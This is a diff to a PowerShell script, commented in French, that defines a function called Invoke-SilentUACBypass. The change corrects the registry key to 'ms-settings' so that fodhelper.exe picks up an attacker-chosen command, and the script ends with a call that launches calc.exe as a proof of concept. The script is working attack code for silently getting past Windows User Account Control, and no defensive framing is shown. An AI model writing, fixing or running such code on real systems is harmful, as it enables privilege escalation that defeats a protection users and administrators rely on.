@@ -10,7 +10,7 @@ function Invoke-SilentUACBypass {
     $ErrorActionPreference = 'Stop'
 
     # === IMPORTANT : Utiliser un nom fixe que fodhelper.exe va chercher ===
-    $FakeCLSID = "ms-settings-tester"
+    $FakeCLSID = "ms-settings"
     $RegPath = "HKCU:\Software\Classes\$FakeCLSID\Shell\Open\Command"
 
     try {
@@ -53,4 +53,5 @@ function Invoke-SilentUACBypass {
 
 # === Appel correct ===
 Invoke-SilentUACBypass -Command "Start-Process 'C:\Windows\System32\calc.exe'"
+
 
